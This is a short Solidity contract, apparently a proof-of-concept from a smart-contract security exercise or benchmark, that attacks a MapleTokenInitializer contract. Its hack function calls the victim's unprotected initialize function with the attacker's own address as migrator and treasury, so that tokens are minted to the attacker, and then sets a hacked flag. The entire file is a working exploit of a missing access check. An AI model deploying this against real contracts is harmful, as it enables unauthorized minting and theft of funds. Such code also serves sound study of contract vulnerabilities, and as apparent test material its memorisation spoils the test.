pragma solidity 0.8.18;

import "../src/MapleTokenInitializer.sol";

contract MapleTokenInitializerExploit {
    MapleTokenInitializer public immutable victim;
    bool private hacked;

    constructor(address _victim) {
        victim = MapleTokenInitializer(_victim);
    }

    function hack() external {
        // Exploit: The 'initialize' function is unprotected, allowing anyone to call it.
        // We'll pass our address for both 'migrator_' and 'treasury_' to mint tokens to ourselves.
        victim.initialize(address(this), address(this));

        hacked = true;
    }

    function isHacked() external view returns (bool) {
        return hacked;
    }
}